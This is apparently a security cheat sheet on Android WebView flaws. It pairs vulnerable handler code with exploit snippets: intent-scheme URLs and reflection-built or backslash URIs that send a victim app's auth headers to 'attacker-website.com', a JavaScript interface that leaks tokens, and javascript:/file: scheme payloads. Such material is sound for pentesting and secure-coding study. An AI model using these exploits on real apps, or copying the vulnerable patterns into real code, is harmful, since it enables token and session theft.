[WebView](https://developer.android.com/reference/android/webkit/WebView) is a View that displays web pages. WebView objects display web content as part of an activity layout, but lack some of the features of fully-developed browsers.

# Access arbitrary components

The Intent class allows developers to convert an intent to a string holding a URI representation of it with the [toUri(flags)](https://developer.android.com/reference/android/content/Intent#toUri%28int%29) method and create an intent from this URI with the [parseUri(stringUri, flags)](https://developer.android.com/reference/android/content/Intent#parseUri%28java.lang.String,%20int%29) method. An app can use this to parse a URL with the `intent` scheme into intent and launch an activity while handling the URL within the WebView. If the handling is not implemented correctly, you can access arbitrary components of the app.

{% embed url="https://0xn3va.gitbook.io/cheat-sheets/android-application/intent-vulnerabilities#access-arbitrary-components" %}

Developers can override the [shouldOverrideUrlLoading()](https://developer.android.com/reference/android/webkit/WebViewClient#shouldOverrideUrlLoading%28android.webkit.WebView,%20android.webkit.WebResourceRequest%29) method of the WebViewClient class to handle all efforts to load a new link within WebView. The example of mishandling might look as follows:

```java
public boolean shouldOverrideUrlLoading(WebView view, WebResourceRequest request) {
    Uri uri = request.getUrl();
    if ("intent".equals(uri.getScheme())) {
        startActivity(Intent.parseUri(uri.toString(), Intent.URI_INTENT_SCHEME));
        return true;
    }
    return super.shouldOverrideUrlLoading(view, request);
}
```

This code adds a custom handler for URLs with the `intent` scheme that launch a new activity using the passed URL. You can exploit this mishandling by creating a WebView and redirecting it to a specially crafted `intent-scheme` URL:

```java
// Intent-scheme URL creation
Intent intent = new Intent();
intent.setClassName("com.victim", "com.victim.AuthWebViewActivity");
intent.putExtra("url", "http://attacker-website.com/");
String url = intent.toUri(Intent.URI_INTENT_SCHEME);
// "intent:#Intent;component=com.victim/.AuthWebViewActivity;S.url=http%3A%2F%2Fattacker-website.com%2F;end"
Log.d("d", url);
```

```java
// AuthWebViewActivity
webView.loadUrl(getIntent().getStringExtra("url"), getAuthHeaders());
```

```javascript
// Redirect within WebView
location.href = "intent:#Intent;component=com.victim/.AuthWebViewActivity;S.url=http%3A%2F%2Fattacker-website.com%2F;end";
```

However, there are several restrictions:

- Intent embedded `Parcelable` and `Serializable` objects cannot be converted to string and these objects will be ignored.
- The [Intent.parseUri(stringUri, flags)](https://developer.android.com/reference/android/content/Intent#parseUri%28java.lang.String,%20int%29) ignores the [Intent.FLAG_GRANT_READ_URI_PERMISSION](https://developer.android.com/reference/android/content/Intent#FLAG_GRANT_READ_URI_PERMISSION) and [Intent.FLAG_GRANT_WRITE_URI_PERMISSION](https://developer.android.com/reference/android/content/Intent#FLAG_GRANT_WRITE_URI_PERMISSION) flags by default. The parser leaves them only if the [Intent.URI_ALLOW_UNSAFE](https://developer.android.com/reference/android/content/Intent#URI_ALLOW_UNSAFE) flag is set.

    ```java
    startActivity(Intent.parseUri(url, Intent.URI_INTENT_SCHEME | Intent.URI_ALLOW_UNSAFE))
    ```

References:
- [Whitepaper – Attacking Android browsers via intent scheme URLs](https://www.mbsd.jp/Whitepaper/IntentScheme.pdf)

# addJavascriptInterface

[addJavascriptInterface](https://developer.android.com/reference/android/webkit/WebView#addJavascriptInterface%28java.lang.Object,%20java.lang.String%29) method injects the supplied Java object into this WebView. The object is injected into all frames of the web page, including all the `iframes`, using the supplied name. This allows the Java object's methods to be accessed from JavaScript (the Java object's fields are not accessible).

This method can provide data to JavaScript or even allow JavaScript to controll the host application. For example, the following interface is leaking a user token:

```java
public class DefaultJavascriptInterface {
    Context context;

    public DefaultJavascriptInterface(Context c) {
        this.context = c;
    }

    @JavascriptInterface
    public getToken() {
        SharedPreferences sharedPref = context.getSharedPreferences(getString(
            R.string.preference_file_key), 
            Context.MODE_PRIVATE
        );
        return sharedPref.getString(getString(R.string.token_key), "")
    }
}
```

```java
public class DefaultActivity extends Activity {
    // ...

    public void loadWebView() {
        WebView webView = (WebView)findViewById(R.id.web_view);
        webView.getSettings().setJavaScriptEnabled(true);
        webView.addJavascriptInterface(new DefaultJavascriptInterface(this), "DefaultJavascriptInterface")
        // ...
    }
}
```

```html
<script>
    alert("Token: " + DefaultJavascriptInterface.getToken());
</script>
```

References:
- [Report: [Grab Android/iOS] Insecure deeplink leads to sensitive information disclosure](https://hackerone.com/reports/401793)

# Bypass URL validation

## Abusing reflection

The [android.net.Uri](https://developer.android.com/reference/android/net/Uri) is an abstract class with a few internal subclasses, that allows you to build custom URI with arbitrary parts using `android.net.Uri$HierarchicalUri`.

Assume, an app implements the following validation:

```java
// AuthWebViewActivity 
Uri uri = getIntent().getData();
boolean isOurDomain = 
    "https".equals(uri.getScheme()) 
    && uri.getUserInfo() == null
    && "legitimate.com".equals(uri.getHost());
if (isOurDomain) {
    webView.load(uri.toString(), getAuthHeaders());
}
```

In this case, you can build a URL that will pass validation, but calling `uri.toString()` will return the attacker's website:

```java
Uri uri;
try {
    Class partClass = Class.forName("android.net.Uri$Part");
    Constructor partConstructor = partClass.getDeclaredConstructors()[0];
    partConstructor.setAccessible(true);

    Class pathPartClass = Class.forName("android.net.Uri$PathPart");
    Constructor pathPartConstructor = pathPartClass.getDeclaredConstructors()[0];
    pathPartConstructor.setAccessible(true);

    Class hierarchicalUriClass = Class.forName("android.net.Uri$HierarchicalUri");
    Constructor hierarchicalUriConstructor = hierarchicalUriClass.getDeclaredConstructors()[0];
    hierarchicalUriConstructor.setAccessible(true);

    Object authority = partConstructor.newInstance("legitimate.com", "legitimate.com");
    Object path = pathPartConstructor.newInstance("@attacker-website.com", "@attacker-website.com");
    uri = (Uri) hierarchicalUriConstructor.newInstance("https", authority, path, null, null);
    // uri.getScheme()   == https
    // uri.getUserInfo() == null
    // uri.getHost()     == legitimate.com
    // uri.toString()    == https://legitimate.com@attacker-website.com
}
catch (Exception e) {
    throw new RuntimeException(e);
}

Intent intent = new Intent();
intent.setData(uri);
intent.setClassName("com.victim", "com.victim.AuthWebViewActivity");
startActivity(intent);
```

This is possible because a victim app does not parse URI itself and trusts the already parsed URI that it received from an untrusted source.

## Broken parser

The [android.net.Uri](https://developer.android.com/reference/android/net/Uri) does not recognize backslashes in the authority part (but `java.net.URI` throws an exception), this allows you to bypass a URL validation. For example, the vulnerable code can look as follows:

```java
Uri uri = Uri.parse(attackerControlledString);
if ("legitimate.com".equals(uri.getHost()) || uri.getHost().endsWith(".legitimate.com")) {
    webView.loadUrl(attackerControlledString, getAuthorizationHeaders());
    // or
    // webView.loadUrl(uri.toString());
}
```

In this case, you can bypass the restriction with backslashes:

```java
String url = "http://attacker-website.com\\\\@legitimate.com/path";
String host = Uri.parse(url).getHost();
// The "host" variable contains the "legitimate.com" value
Log.d("d", host);
// WebView loads the attacker-website.com
webView.loadUrl(url, getAuthorizationHeaders());
```

## Missing scheme validation

If an app does not validate the scheme value (but may validates the host one) you can try to abuse this with with `javascript` and `file` schemes URLs:

```http
javascript://legitimate.com/%0aalert(1)//

file://legitimate.com/sdcard/payload.html
```

# setWebContentsDebuggingEnabled

[setWebContentsDebuggingEnabled](https://developer.android.com/reference/android/webkit/WebView.html#setWebContentsDebuggingEnabled%28boolean%29) enables debugging of web contents (HTML/CSS/JavaScript) loaded into any WebViews of an application. This flag is used in order to facilitate debugging of web layouts and JavaScript code running inside WebViews.

{% hint style="info" %}
`WebContentsDebugging` is not affected by the state of the `debuggable` flag in the application's manifest. 
{% endhint %}

Enabling this flag allows you to execute arbitrary JavaScript code within any WebViews of an application.

References:
- [Remote debugging WebViews](https://developer.chrome.com/docs/devtools/remote-debugging/webviews/)

# References

- [Oversecured: Android Access to app protected components](https://blog.oversecured.com/Android-Access-to-app-protected-components/)
- [Golden techniques to bypass host validations in Android apps](https://hackerone.com/reports/431002)
